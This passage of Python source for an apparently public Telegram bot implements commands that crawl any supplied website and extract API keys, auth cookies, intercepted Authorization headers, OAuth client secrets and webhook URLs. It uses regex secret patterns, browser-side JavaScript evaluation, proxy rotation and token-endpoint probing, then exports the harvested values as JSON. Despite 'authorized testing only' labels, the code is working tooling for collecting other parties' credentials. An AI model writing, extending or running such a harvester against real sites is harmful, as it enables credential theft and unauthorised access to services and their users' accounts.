                for hk, hv in req.get("headers", {}).items():
                    lines.append(f"     `{hk}: {str(hv)[:50]}`")
            lines.append("")

        # ── Auth cookies ─────────────────────────────────────────────────────
        interesting_cookies = [
            c for c in dyn.get("cookies", [])
            if any(k in c["name"].lower() for k in
                   ["token", "auth", "session", "key", "jwt", "access", "secret", "api"])
        ]
        if interesting_cookies:
            lines.append(f"🍪 *Auth Cookies* `({len(interesting_cookies)})`")
            for c in interesting_cookies[:5]:
                badge, _ = _kd_confidence("Token", c["value"])
                lines.append(f"  {badge} `{c['name']}` = `{c['value'][:50]}`")
            lines.append("")

        # ── High-entropy strings ──────────────────────────────────────────────
        if entropy:
            lines.append(f"🔬 *High-Entropy Strings* `(H≥4.2)` — `{len(entropy)}` found")
            for item in entropy[:6]:
                badge, _ = _kd_confidence("entropy", item["value"])
                lines.append(
                    f"  {badge} H=`{item['entropy']}` `{item['value'][:55]}`"
                )
            lines.append("")

        # ── Source maps ───────────────────────────────────────────────────────
        if smaps:
            lines.append(f"🗺 *Source Maps Found* `({len(smaps)})`")
            for sm in smaps[:3]:
                lines.append(f"  `{sm[-60:]}`")
            lines.append("")

    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
        "⚠️ _For authorized/security research use only_",
        "",
        f"💾 Reply with /kdexport to get full JSON report",
    ]

    return "\n".join(lines), result


def _keydump_keyboard(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📋 Show Raw", callback_data=f"kd_raw_{uid}"),
            InlineKeyboardButton("🔬 Entropy", callback_data=f"kd_entropy_{uid}"),
        ],
        [
            InlineKeyboardButton("💾 Export JSON", callback_data=f"kd_json_{uid}"),
        ],
    ])

# Global keydump result cache (per uid)
_kd_cache: dict = {}   # {uid: result_dict}


@user_guard
async def cmd_keydump(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/keydump <url> — Comprehensive key/token extractor (HTML + JS + Dynamic)"""
    if not context.args:
        await update.effective_message.reply_text(
            "🔑 *KeyDump v18 — Flagship Key Extractor*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "*Usage:* `/keydump https://example.com/path/page`\n\n"
            "*Scans ALL of the following at once:*\n"
            f"• {len(_KD_PATTERNS)} regex patterns (TruffleHog/Gitleaks style)\n"
            "• High-entropy string analysis (H > 4.5)\n"
            "• Source map extraction (.js.map)\n"
            "• Browser storage (localStorage, sessionStorage, cookies)\n"
            "• Network request interception (Authorization headers)\n"
            "• All linked JS bundles (up to 15 files)\n\n"
            "*Categories scanned:*\n"
            "☁️ Cloud  🔥 Firebase  💳 Payment  🧬 JWT\n"
            "📱 Social  📊 Analytics  🔒 Secrets  📨 Comms\n\n"
            f"⚡ Dynamic mode: {'✅ Playwright ready' if PLAYWRIGHT_OK else '⚠️ Static only (pip install playwright)'}",
            parse_mode="Markdown"
        )
        return

    uid  = update.effective_user.id
    raw  = context.args[0]
    url  = raw if raw.startswith("http") else "https://" + raw

    # ── Security checks ────────────────────────────────────────
    ok, reason = is_safe_url(url)
    if not ok:
        await update.effective_message.reply_text(
            f"🚫 `{reason}`", parse_mode="Markdown"); return

    ok2, wait = check_rate_limit(uid)
    if not ok2:
        await update.effective_message.reply_text(
            f"⏳ Rate limit — `{wait}s` စောင့်ပါ", parse_mode="Markdown"); return

    domain = urlparse(url).netloc
    path   = urlparse(url).path or "/"

    msg = await update.effective_message.reply_text(
        f"🔑 *KeyDump Scanning...*\n"
        f"🌐 `{domain}`\n"
        f"📁 `{path}`\n\n"
        f"① HTML fetch + JS bundle crawl...\n"
        f"② Pattern matching (`{len(_KD_PATTERNS)}` rules)...\n"
        f"③ Entropy analysis...\n"
        f"④ Source map check...\n"
        "⑤ Dynamic intercept (Playwright)...",
        parse_mode="Markdown"
    )

    try:
        result = await asyncio.to_thread(_run_keydump_sync, url)
    except Exception as e:
        await msg.edit_text(
            f"❌ *KeyDump Error*\n`{type(e).__name__}: {str(e)[:100]}`",
            parse_mode="Markdown")
        return

    # Cache result for export callbacks
    _kd_cache[uid] = result

    report, _ = _format_keydump_report(result)

    total = sum(len(v) for cat in result["by_category"].values() for v in cat.values())
    kb = _keydump_keyboard(uid) if total > 0 or result["high_entropy"] else None

    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode="Markdown",
                                reply_markup=kb)
        else:
            await msg.edit_text(report[:4000] + "\n_...continued_",
                                parse_mode="Markdown", reply_markup=kb)
            await update.effective_message.reply_text(
                report[4000:8000], parse_mode="Markdown")
    except Exception:
        await update.effective_message.reply_text(
            report[:4000], parse_mode="Markdown")


async def keydump_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /keydump inline buttons: raw, entropy, json export"""
    query = update.callback_query
    await query.answer()
    data = query.data   # kd_raw_UID | kd_entropy_UID | kd_json_UID

    try:
        parts  = data.split("_")
        action = parts[1]                    # raw / entropy / json
        uid    = int(parts[2])
    except Exception:
        return

    # Only the requesting user can use the buttons
    if query.from_user.id != uid:
        await query.answer("🚫 သင်မဟုတ်ပါ", show_alert=True)
        return

    result = _kd_cache.get(uid)
    if not result:
        await query.answer("⚠️ Cache expired — /keydump ထပ်လုပ်ပါ", show_alert=True)
        return

    if action == "raw":
        lines = ["📋 *Raw Findings*\n"]
        for label, vals in result["raw_hits"].items():
            lines.append(f"*{label}:*")
            for v in vals[:4]:
                lines.append(f"  `{v[:80]}`")
            lines.append("")
        text = "\n".join(lines) or "Nothing found"
        try:
            await query.edit_message_text(text[:4000], parse_mode="Markdown")
        except Exception:
            await query.message.reply_text(text[:4000], parse_mode="Markdown")

    elif action == "entropy":
        entropy = result.get("high_entropy", [])
        if not entropy:
            await query.answer("High-entropy strings မတွေ့ပါ", show_alert=True)
            return
        lines = [f"🔬 *High-Entropy Strings ({len(entropy)})*\n",
                 "_H > 4.5 = likely secret/key_\n"]
        for item in entropy[:15]:
            lines.append(
                f"H=`{item['entropy']}` `{item['value'][:65]}`"
            )
        try:
            await query.edit_message_text(
                "\n".join(lines), parse_mode="Markdown")
        except Exception:
            await query.message.reply_text(
                "\n".join(lines)[:4000], parse_mode="Markdown")

    elif action == "json":
        # Export as JSON file
        try:
            export = {
                "url":         result["url"],
                "scanned_at":  datetime.now().isoformat(),
                "js_bundles":  result["js_count"],
                "findings":    result["raw_hits"],
                "high_entropy": result["high_entropy"],
                "source_maps": result["source_maps"],
                "dynamic":     {
                    "intercepted_requests": result["dynamic"]["requests"],
                    "auth_cookies": [
                        c for c in result["dynamic"].get("cookies", [])
                        if any(k in c["name"].lower() for k in
                               ["token","auth","session","key","jwt"])
                    ],
                },
                "errors":      result["errors"],
            }
            import tempfile, os as _os
            tmp = tempfile.NamedTemporaryFile(
                suffix=".json", delete=False, mode="w", encoding="utf-8"
            )
            json.dump(export, tmp, ensure_ascii=False, indent=2)
            tmp.close()

            domain = urlparse(result["url"]).netloc.replace(".", "_")
            ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname  = f"keydump_{domain}_{ts}.json"

            with open(tmp.name, "rb") as f:
                await context.bot.send_document(
                    chat_id=query.from_user.id,
                    document=f,
                    filename=fname,
                    caption=(
                        f"💾 *KeyDump JSON Export*\n"
                        f"🌐 `{result['url'][:60]}`\n"
                        f"📊 `{sum(len(v) for v in export['findings'].values())}` findings"
                    ),
                    parse_mode="Markdown"
                )
            _os.unlink(tmp.name)
            await query.answer("✅ JSON exported!", show_alert=False)
        except Exception as e:
            await query.answer(f"Export error: {e}", show_alert=True)


# ── /kdexport shortcut ────────────────────────────────────────
@user_guard
async def cmd_kdexport(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/kdexport — Export last keydump result as JSON"""
    uid    = update.effective_user.id
    result = _kd_cache.get(uid)
    if not result:
        await update.effective_message.reply_text(
            "⚠️ Cache မရှိပါ — `/keydump <url>` ကနေ scan ဦးစွာ လုပ်ပါ",
            parse_mode="Markdown"); return

    # Trigger json export inline
    export = {
        "url":          result["url"],
        "scanned_at":   datetime.now().isoformat(),
        "js_bundles":   result["js_count"],
        "findings":     result["raw_hits"],
        "high_entropy": result["high_entropy"],
        "source_maps":  result["source_maps"],
        "dynamic":      result["dynamic"],
        "errors":       result["errors"],
    }
    import tempfile, os as _os
    tmp = tempfile.NamedTemporaryFile(
        suffix=".json", delete=False, mode="w", encoding="utf-8"
    )
    json.dump(export, tmp, ensure_ascii=False, indent=2)
    tmp.close()

    domain = urlparse(result["url"]).netloc.replace(".", "_")
    ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname  = f"keydump_{domain}_{ts}.json"

    with open(tmp.name, "rb") as f:
        await context.bot.send_document(
            chat_id=uid,
            document=f,
            filename=fname,
            caption=(
                f"💾 *KeyDump Export*\n"
                f"🌐 `{result['url'][:60]}`\n"
                f"📊 `{sum(len(v) for v in export['findings'].values())}` total findings"
            ),
            parse_mode="Markdown"
        )
    _os.unlink(tmp.name)



# ══════════════════════════════════════════════════
# 🔐  /oauthscan — OAuth Token & Client Secret Scanner
# ══════════════════════════════════════════════════

_OAUTH_PATTERNS = [
    # OAuth Client IDs
    ("Google OAuth Client ID",
     re.compile(r'\b([0-9]{12,}-[a-z0-9]{32}\.apps\.googleusercontent\.com)\b')),
    # OAuth Client Secrets
    ("Google OAuth Client Secret",
     re.compile(r'(?i)client[_\-]?secret\s*[=:]\s*["\']?(GOCSPX-[A-Za-z0-9_\-]{28,})["\']?')),
    # Generic Client ID
    ("Generic Client ID",
     re.compile(r'(?i)client[_\-]?id\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{20,120})["\']')),
    # Generic Client Secret
    ("Generic Client Secret",
     re.compile(r'(?i)client[_\-]?secret\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{16,120})["\']')),
    # Facebook App ID / Secret
    ("Facebook App ID",
     re.compile(r'(?i)(?:fb|facebook)[_\-]?app[_\-]?id\s*[=:]\s*["\']?([0-9]{10,20})["\']?')),
    ("Facebook App Secret",
     re.compile(r'(?i)(?:fb|facebook)[_\-]?(?:app[_\-]?)?secret\s*[=:]\s*["\']([a-f0-9]{32})["\']')),
    # Twitter / X OAuth
    ("Twitter Consumer Key",
     re.compile(r'(?i)(?:twitter|TWITTER)[_\-]?(?:consumer[_\-]?key|api[_\-]?key)\s*[=:]\s*["\']([A-Za-z0-9]{25,60})["\']')),
    ("Twitter Consumer Secret",
     re.compile(r'(?i)(?:twitter|TWITTER)[_\-]?(?:consumer[_\-]?secret|api[_\-]?secret)\s*[=:]\s*["\']([A-Za-z0-9]{40,80})["\']')),
    # GitHub OAuth App
    ("GitHub OAuth App Secret",
     re.compile(r'(?i)github[_\-]?(?:client[_\-]?secret|oauth[_\-]?secret)\s*[=:]\s*["\']([a-f0-9]{40})["\']')),
    # LinkedIn
    ("LinkedIn Client ID",
     re.compile(r'(?i)linkedin[_\-]?(?:client[_\-]?id|app[_\-]?id)\s*[=:]\s*["\']([A-Za-z0-9]{12,30})["\']')),
    ("LinkedIn Client Secret",
     re.compile(r'(?i)linkedin[_\-]?(?:client[_\-]?secret)\s*[=:]\s*["\']([A-Za-z0-9]{16,40})["\']')),
    # Discord
    ("Discord Client ID",
     re.compile(r'(?i)discord[_\-]?(?:client[_\-]?id|bot[_\-]?id)\s*[=:]\s*["\']?([0-9]{17,20})["\']?')),
    ("Discord Client Secret",
     re.compile(r'(?i)discord[_\-]?(?:client[_\-]?secret|token)\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{20,80})["\']')),
    # Spotify
    ("Spotify Client ID",
     re.compile(r'(?i)spotify[_\-]?client[_\-]?id\s*[=:]\s*["\']([a-f0-9]{32})["\']')),
    ("Spotify Client Secret",
     re.compile(r'(?i)spotify[_\-]?client[_\-]?secret\s*[=:]\s*["\']([a-f0-9]{32})["\']')),
    # Auth0
    ("Auth0 Client ID",
     re.compile(r'(?i)auth0[_\-]?client[_\-]?id\s*[=:]\s*["\']([A-Za-z0-9]{32})["\']')),
    ("Auth0 Client Secret",
     re.compile(r'(?i)auth0[_\-]?client[_\-]?secret\s*[=:]\s*["\']([A-Za-z0-9_\-]{40,100})["\']')),
    # OAuth Bearer / Access Tokens in HTML/JS
    ("OAuth Bearer Token",
     re.compile(r'(?i)(?:bearer|Bearer)\s+([A-Za-z0-9_\-\.]{40,300})')),
    # Okta
    ("Okta Client ID",
     re.compile(r'(?i)okta[_\-]?client[_\-]?id\s*[=:]\s*["\']([A-Za-z0-9]{20,50})["\']')),
    # Generic redirect_uri (OAuth flow leak)
    ("OAuth redirect_uri",
     re.compile(r'(?i)redirect[_\-]?uri\s*[=:]\s*["\']?(https?://[^\s"\'&]{10,200})["\']?')),
]

_OAUTH_JS_EVAL = """() => {
    const results = {};
    const kwds = [
        'clientId','client_id','clientSecret','client_secret',
        'GOOGLE_CLIENT_ID','GOOGLE_CLIENT_SECRET',
        'FACEBOOK_APP_ID','FACEBOOK_APP_SECRET',
        'TWITTER_CONSUMER_KEY','TWITTER_CONSUMER_SECRET',
        'GITHUB_CLIENT_ID','GITHUB_CLIENT_SECRET',
        'AUTH0_CLIENT_ID','SPOTIFY_CLIENT_ID',
        'DISCORD_CLIENT_ID','LINKEDIN_CLIENT_ID',
        'oauthClientId','oauthClientSecret','oAuthKey',
    ];
    kwds.forEach(k => {
        try {
            const v = window[k]
                   || (window.__ENV__ && window.__ENV__[k])
                   || (window._env_ && window._env_[k])
                   || (window.ENV && window.ENV[k])
                   || (window.__NEXT_DATA__ && window.__NEXT_DATA__[k]);
            if (v && typeof v === 'string' && v.length > 8)
                results[k] = v;
        } catch(e) {}
    });
    // Scan meta tags for client_id
    document.querySelectorAll('meta').forEach(m => {
        const n = (m.name || m.getAttribute('property') || '').toLowerCase();
        if ((n.includes('client') || n.includes('oauth') || n.includes('app_id'))
            && m.content && m.content.length > 6) {
            results['meta:' + n] = m.content;
        }
    });
    return results;
}"""

def _oauthscan_sync(url: str, progress_cb=None) -> dict:
    """Improved OAuth scanner — redirect_uri, PKCE, state, implicit, token endpoints."""
    data = _extract_run(url, _OAUTH_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    findings = []
    seen     = set()
    risks    = []

    def _add(key_type, value, source, risk=None):
        dedup = key_type + ":" + value[:60]
        if dedup in seen or len(value) < 8:
            return
        seen.add(dedup)
        entry = {"type": key_type, "value": value, "source": source}
        if risk:
            entry["risk"] = risk
        findings.append(entry)

    if progress_cb:
        progress_cb("🔍 Scanning OAuth tokens, redirect_uris, PKCE, state params...")

    all_patterns = list(_OAUTH_PATTERNS) + _OAUTH_PATTERNS_EXTRA

    redirect_uris  = []
    state_params   = []
    pkce_found     = False
    implicit_found = []

    for text, label in _gather_all_text(data):
        for key_type, pat in all_patterns:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                val = val.strip()
                _add(key_type, val, label)

                if key_type == "OAuth redirect_uri":
                    redirect_uris.append(val)
                elif key_type == "OAuth state param":
                    state_params.append(val)
                elif key_type == "PKCE code_challenge":
                    pkce_found = True
                elif key_type == "Implicit access_token (fragment)":
                    implicit_found.append(val)

    # DOM globals
    for k, v in (data.get("dom_result") or {}).items():
        for key_type, pat in all_patterns:
            m = pat.search(str(v))
            if m:
                val = (m.group(1) if m.lastindex else m.group(0)).strip()
                _add(key_type, val, f"window.{k}")

    # ── Risk analysis ─────────────────────────────
    if redirect_uris:
        _add("redirect_uri summary",
             f"{len(redirect_uris)} uri(s) found: {', '.join(redirect_uris[:3])}",
             "Analysis")
        # Check for open redirect_uri (wildcard or non-https)
        for ru in redirect_uris:
            if ru.startswith("http://"):
                risks.append(f"MEDIUM: redirect_uri uses HTTP (not HTTPS): {ru[:60]}")
            if "*" in ru or ru.endswith("/"):
                risks.append(f"HIGH: Potentially wildcarded redirect_uri: {ru[:60]}")

    if not state_params and redirect_uris:
        risks.append(
            "HIGH: OAuth flow detected but no `state` param found — "
            "CSRF on authorization endpoint possible"
        )

    if implicit_found:
        risks.append(
            "MEDIUM: Implicit flow access_token found in URL fragment — "
            "tokens exposed in browser history / referrer headers"
        )

    if pkce_found:
        findings.append({
            "type":   "PKCE",
            "value":  "code_challenge detected — PKCE in use ✅",
            "source": "Analysis",
        })
    elif redirect_uris:
        risks.append("LOW: No PKCE (code_challenge) detected in OAuth flow")

    # ── Token endpoint probe ──────────────────────
    if progress_cb:
        progress_cb("🔍 Probing token endpoints...")
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    for ep_path in _OAUTH_TOKEN_ENDPOINTS:
        try:
            r = requests.options(
                origin + ep_path, timeout=5, verify=False,
                headers=_get_headers(), proxies=proxy_manager.get_proxy()
            )
            if r.status_code in (200, 405, 401):
                _add(
                    "Token endpoint",
                    origin + ep_path,
                    f"Probe [{r.status_code}]",
                )
        except Exception:
            pass

    return {
        "error":         None,
        "findings":      findings,
        "page_url":      data["page_url"],
        "requests":      len(data.get("network_log", [])),
        "redirect_uris": redirect_uris,
        "state_found":   bool(state_params),
        "pkce":          pkce_found,
        "implicit":      implicit_found,
        "risks":         risks,
    }


# ───────────────────────────────────────────────────────────────────
# [6] REPLACE _hiddenkeys_sync + expand _CSRF_PATTERNS
#     (original: line ~8706)
#     IMPROVEMENTS:
#       + meta[name=csrf-token] scan
#       + CSP header nonce extraction
#       + Service worker (sw.js) scan
#       + 15 new CSRF/token regex patterns
#       + IndexedDB key name enumeration via JS eval
# ───────────────────────────────────────────────────────────────────

# REPLACE _CSRF_PATTERNS entirely with this expanded version:
_WEBHOOK_PATTERNS = [
    # Slack
    ("Slack Incoming Webhook",
     re.compile(r'(https://hooks\.slack\.com/services/T[A-Za-z0-9_]+/B[A-Za-z0-9_]+/[A-Za-z0-9_]+)')),
    ("Slack Workflow Webhook",
     re.compile(r'(https://hooks\.slack\.com/workflows/[A-Za-z0-9_/]+)')),
    # Discord
    ("Discord Webhook",
     re.compile(r'(https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+)')),
    # Microsoft Teams
    ("MS Teams Webhook",
     re.compile(r'(https://[a-z0-9]+\.webhook\.office\.com/webhookb2/[A-Za-z0-9@%\-_\./]+)')),
    # GitHub Webhooks
    ("GitHub Webhook Secret",
     re.compile(r'(?i)github[_\-]?webhook[_\-]?secret\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,80})["\']')),
    # Telegram Bot Webhook
    ("Telegram Webhook URL",
     re.compile(r'(https://api\.telegram\.org/bot[A-Za-z0-9_:]+/setWebhook[^\s"\'<>]{0,200})')),
    # Zapier
    ("Zapier Webhook",
     re.compile(r'(https://hooks\.zapier\.com/hooks/catch/[A-Za-z0-9/]+)')),
    # IFTTT
    ("IFTTT Webhook",
     re.compile(r'(https://maker\.ifttt\.com/trigger/[^\s"\'<>&]{5,100})')),
    # PagerDuty
    ("PagerDuty Webhook",
     re.compile(r'(https://events\.pagerduty\.com/v2/enqueue[^\s"\'<>]{0,100})')),
    # Generic webhook keyword
    ("Generic Webhook URL",
     re.compile(r'(?i)webhook[_\-]?url\s*[=:]\s*["\']?(https?://[^\s"\'<>&]{15,300})["\']?')),
    # Stripe / Payment webhooks
    ("Stripe Webhook Secret",
     re.compile(r'\b(whsec_[A-Za-z0-9]{32,100})\b')),
    # Generic /webhook endpoint reference
    ("Webhook Endpoint Path",
     re.compile(r'(?i)["\']/(api/)?webhooks?/[A-Za-z0-9_\-/]{3,80}["\']')),
    # Datadog
    ("Datadog Webhook",
     re.compile(r'(https://app\.datadoghq\.com/intake/webhook/[^\s"\'<>]{5,100})')),
    # Jira / Confluence
    ("Atlassian Webhook",
     re.compile(r'(https://[a-z0-9\-]+\.atlassian\.net/rest/webhooks/[^\s"\'<>]{5,150})')),
]

_WEBHOOK_JS_EVAL = """() => {
    const results = {};
    const kwds = [
        'webhookUrl','webhook_url','WEBHOOK_URL',
        'SLACK_WEBHOOK','DISCORD_WEBHOOK','TEAMS_WEBHOOK',
        'slackWebhook','discordWebhook','zapierWebhook',
        'notifyUrl','notify_url','callbackUrl','callback_url',
    ];
    kwds.forEach(k => {
        try {
            const v = window[k]
                   || (window.__ENV__ && window.__ENV__[k])
                   || (window._env_ && window._env_[k])
                   || (window.ENV && window.ENV[k]);
            if (v && typeof v === 'string' && v.startsWith('http'))
                results[k] = v;
        } catch(e) {}
    });
    // Look for fetch/axios calls pointing to webhook-like URLs
    const scripts = document.querySelectorAll('script:not([src])');
    const webhookPat = /https?:\/\/hooks\.(slack|zapier)\.com[^\s"'<>]{5,200}/gi;
    scripts.forEach(s => {
        const m = s.textContent.match(webhookPat);
        if (m) m.forEach((url, i) => { results['inline_script_' + i] = url; });
    });
    return results;
}"""

def _webhooks_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _WEBHOOK_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    findings = []
    seen = set()

    def _add(key_type, value, source):
        dedup = key_type + ":" + value[:80]
        if dedup in seen or len(value) < 8:
            return
        seen.add(dedup)
        findings.append({"type": key_type, "value": value, "source": source})

    if progress_cb: progress_cb("🪝 Scanning for exposed webhook URLs...")

    for text, label in _gather_all_text(data):
        for key_type, pat in _WEBHOOK_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)

    # DOM globals
    for k, v in (data.get("dom_result") or {}).items():
        for key_type, pat in _WEBHOOK_PATTERNS:
            m = pat.search(str(v))
            if m:
                _add(key_type, (m.group(1) if m.lastindex else m.group(0)), f"window.{k}")

    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_webhooks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/webhooks <url> — Extract exposed webhook URLs from a site"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/webhooks https://example.com`\n\n"
            "🪝 *Detects:*\n"
            "  • Slack / Discord / MS Teams webhooks\n"
            "  • Zapier / IFTTT / PagerDuty hooks\n"
            "  • Stripe webhook secrets (`whsec_...`)\n"
            "  • Telegram bot webhook URLs\n"
            "  • Datadog / Atlassian / Generic webhooks\n"
            "  • GitHub webhook secrets\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🪝 *Webhook Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')

    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(
                    f"🪝 *Webhook Extractor — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())

    try:
        result = await asyncio.to_thread(_webhooks_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return

    findings = result["findings"]
    page_url = result["page_url"]
    reqs     = result.get("requests", 0)

    if not findings:
        await msg.edit_text(
            f"🪝 *Webhook Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No webhook URLs found\n"
            f"🌐 `{page_url}`\n📡 Requests: `{reqs}`",
            parse_mode='Markdown')
        return

    lines = [
        f"🪝 *Webhook Extractor — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"🌐 `{page_url}`",
        f"📡 Requests: `{reqs}`",
        f"✅ Found: `{len(findings)}`\n",
    ]
    for i, f in enumerate(findings, 1):
        lines.append(f"*[{i}] {f['type']}*")
        lines.append(f"  `{f['value'][:80]}`")
        lines.append(f"  _📂 {f['source'][:60]}_\n")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


# ══════════════════════════════════════════════════
# ══════════════════════════════════════════════════
# 🔐  FORCE-JOIN GATE
# ══════════════════════════════════════════════════

async def check_force_join(update: Update, context) -> bool:
    """
    Returns True if the user may proceed.
    Returns False (and sends a join prompt) if force_join is enabled
    and the user is not yet a member of the required channel.
    Admins always pass through.
    """
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True

    db = await db_read()
    channel = db.get("settings", {}).get("force_join")
    if not channel:
        return True  # force-join not configured

    try:
        member = await context.bot.get_chat_member(chat_id=channel, user_id=uid)
        if member.status in ("member", "administrator", "creator"):
            return True
    except Exception:
        pass  # channel not found or bot not admin — fail open

    # User not in channel — send prompt
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{channel.lstrip('@')}"),
        InlineKeyboardButton("✅ I Joined", callback_data="fj_check"),
    ]])
    await update.effective_message.reply_text(
        f"🔒 ဒီ Bot ကို သုံးဖို့ *{channel}* Channel ကို Join လုပ်ပါ။\n\n"
        "Join လုပ်ပြီးရင် *✅ I Joined* ကို နှိပ်ပါ။",
        reply_markup=kb,
        parse_mode='Markdown'
    )
    return False


async def force_join_callback(update: Update, context) -> None:
    """Handles the '✅ I Joined' button — re-checks membership."""
    query = update.callback_query
    await query.answer()

    uid  = query.from_user.id
    db   = await db_read()
    channel = db.get("settings", {}).get("force_join")

    if not channel:
        await query.edit_message_text("✅ Bot ကို အသုံးပြုနိုင်ပါပြီ။")
        return

    try:
        member = await context.bot.get_chat_member(chat_id=channel, user_id=uid)
        joined = member.status in ("member", "administrator", "creator")
    except Exception:
        joined = False

    if joined:
        await query.edit_message_text(
            f"✅ *{channel}* Channel Join လုပ်ပြီးပါပြီ!\n\n"
            "Bot command တွေကို အသုံးပြုနိုင်ပါပြီ။",
            parse_mode='Markdown'
        )
    else:
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{channel.lstrip('@')}"),
            InlineKeyboardButton("✅ I Joined", callback_data="fj_check"),
        ]])
        await query.edit_message_text(
            f"❌ *{channel}* Channel ကို မတွေ့သေးပါ။\n\n"
            "Join လုပ်ပြီးမှ ထပ်ကြိုးစားပါ။",
            reply_markup=kb,
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 📦  APP ASSETS CATEGORY CALLBACK
# ══════════════════════════════════════════════════

async def appassets_cat_callback(update: Update, context) -> None:
    """Handles apa_<category> inline button selections from /appassets."""
    query = update.callback_query
    await query.answer()

    uid  = query.from_user.id
    data = query.data  # e.g. "apa_images" or "apa_all"

    async with db_lock:
        db = _load_db_sync()
    u        = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await query.edit_message_text(
            "❌ Upload file ကို မတွေ့တော့ပါ။\n"
            "ဖိုင်ကို ပြန် Upload လုပ်ပြီး `/appassets` ကို ထပ်ရိုက်ပါ။",
            parse_mode='Markdown'
        )
        return

    cat_key = data[4:]  # strip "apa_"
    valid_cats = set(_ASSET_CATEGORIES.keys())

    if cat_key == "all":
        wanted_cats = valid_cats
    elif cat_key in valid_cats:
        wanted_cats = {cat_key}
    else:
        await query.answer("Unknown category.", show_alert=True)
        return

    # Acknowledge the selection by editing the menu message
    try:
        await query.edit_message_text(
            f"📦 Category: `{cat_key}` — Extracting...",
            parse_mode='Markdown'
        )
    except Exception:
        pass

    await _do_appassets_extract(query.message, context, last_app, wanted_cats)


# 🛡️  MISSING COMMAND HANDLERS
# ══════════════════════════════════════════════════

async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/vuln <url> — Full vulnerability scan (headers, paths, CORS, open-redirect, subdomains)"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/vuln https://example.com`\n\n"
            "🛡️ *Scans for:*\n"
            "  • Exposed sensitive paths (admin, .env, backups…)\n"
            "  • Missing security headers (CSP, HSTS, X-Frame…)\n"
            "  • CORS misconfiguration\n"
            "  • Open redirect vulnerabilities\n"
            "  • Clickjacking exposure\n"
            "  • Live subdomain discovery\n\n"
            "⚠️ _Authorized security testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🛡️ *Vuln Scan — `{domain}`*\n\n⏳ Starting scan...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🛡️ *Vuln Scan — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
